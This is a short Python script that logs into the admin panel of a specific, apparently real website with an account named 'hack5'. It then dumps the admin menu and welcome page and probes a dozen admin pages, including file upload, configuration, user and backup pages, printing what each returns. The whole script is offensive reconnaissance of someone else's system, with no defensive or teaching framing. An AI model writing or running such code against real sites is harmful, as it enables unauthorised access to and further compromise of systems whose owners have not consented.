import requests, re

s = requests.Session()
s.get("http://bjhzsv.com/main/", timeout=10)
s.post("http://bjhzsv.com/main/a7chkuser.asp",
    data={"t1": "hack5", "t2": "test123", "t3": "0000"},
    headers={"Referer": "http://bjhzsv.com/main/"}, timeout=10)

# Menu
r = s.get("http://bjhzsv.com/main/a7menu.asp", timeout=10)
menu = r.content.decode("gb2312", errors="replace")
links = re.findall(r"href=[\"']([^\"']+)", menu)
texts = re.findall(r"<a[^>]*>([^<]+)</a>", menu)
print("=== ADMIN MENU ===")
for url, text in zip(links, texts):
    print("  %-40s | %s" % (url, text.strip()))

# Welcome page
r = s.get("http://bjhzsv.com/main/inc/welcome/1.asp", timeout=10)
welcome = r.content.decode("gb2312", errors="replace")
print("\n=== WELCOME INFO ===")
for line in welcome.split("\n"):
    line = line.strip()
    if len(line) > 10 and "<" not in line[:5]:
        print("  " + line[:100])

# Try file manager/upload pages
for page in ["a7upfile.asp", "a7upload.asp", "a7add.asp", "a7edit.asp", 
             "a7list.asp", "a7news.asp", "a7product.asp", "a7config.asp",
             "a7system.asp", "a7user.asp", "a7data.asp", "a7backup.asp"]:
    r = s.get("http://bjhzsv.com/main/" + page, timeout=5)
    if r.status_code == 200 and len(r.text) > 100:
        print("\n=== %s (Size: %d) ===" % (page, len(r.text)))
        text = r.content.decode("gb2312", errors="replace")
        print(text[:300])
